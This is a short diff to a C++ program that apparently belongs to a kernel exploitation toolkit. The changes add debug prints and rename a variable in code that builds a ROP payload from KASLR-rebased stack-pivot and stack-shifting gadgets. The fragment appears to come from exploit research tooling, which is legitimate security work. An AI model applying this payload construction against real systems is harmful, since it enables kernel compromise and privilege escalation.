@@ -117,6 +117,7 @@ int main(int argc, const char** argv) {
         auto pop_rsp = pivot_finder.GetPopRsp();
         if (!pop_rsp.has_value())
             throw ExpKitError("could not find a pop rsp gadget");
+        printf("[+] Selected POP RSP pivot: stack_change_before_rsp=%lu, next_rip_offset=%lu\n", pop_rsp->stack_change_before_rsp, pop_rsp->next_rip_offset);
 
         payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + pop_rsp->address);
         payload.Set(stack_pivot->GetDestinationOffset() + 8, heap_addr);
@@ -128,11 +129,13 @@ int main(int argc, const char** argv) {
         auto shift_gadget = pivot_finder.FindShift(0x30, 0x48);
         if (!shift_gadget.has_value())
             throw ExpKitError("could not find a shift gadget");
+        printf("[+] Selected stack shifting pivot: shift_amount=%lu, ret_offset=%lu\n", shift_gadget->shift_amount, shift_gadget->ret_offset);
+
         // TODO: make interface more similar, e.g. use GetGadgetOffset()
         payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + shift_gadget->address);
         // TODO: shifting is weird with this +8 for the current pointer
-        auto rop_idx = stack_pivot->GetDestinationOffset() + 8 + shift_gadget->ret_offset;
-        payload.Set(rop_idx, rop.GetData());
+        auto rop_offs = stack_pivot->GetDestinationOffset() + 8 + shift_gadget->ret_offset;
+        payload.Set(rop_offs, rop.GetData());
     }
 
     printf("[+] Payload:\n");
